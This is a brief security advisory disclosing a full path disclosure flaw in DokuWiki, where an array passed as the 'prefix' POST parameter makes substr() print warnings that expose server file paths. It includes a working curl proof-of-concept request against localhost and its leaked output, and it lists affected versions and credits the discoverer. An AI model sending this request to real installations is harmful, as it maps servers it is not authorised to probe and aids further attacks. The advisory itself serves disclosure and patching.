It works on plain text files and thus needs no database. It has a simple but powerful syntax which makes sure the datafiles remain readable outside the Wiki.    The POST input 'prefix' is not checked/casted for proper data type before passing to PHP's substr() function, which lead to displays an warning with sensitive information on server with PHP error level enabled:    $PRE   = cleanText(substr($_POST['prefix'], 0, -1));  $ curl -dprefix[]=1 http://localhost/dokuwiki/doku.php 2> /dev/null | grep Warning <b>Warning</b>:  substr() expects parameter 1 to be string, array given in <b>/var/www/dokuwiki/doku.php</b> on line <b>47</b><br /> <b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/dokuwiki/doku.php:47) in <b>/var/www/dokuwiki/inc/actions.php</b> on line />  Affected versions: ======================================== - Angua (RC1) - Rincewind - Anteater  References: ======================================== http://www.freelists.org/post/dokuwiki/Fwd-DokuWiki-Full-path-disclosure  Credits: ======================================== This vulnerability was discovered by Felipe Pena.
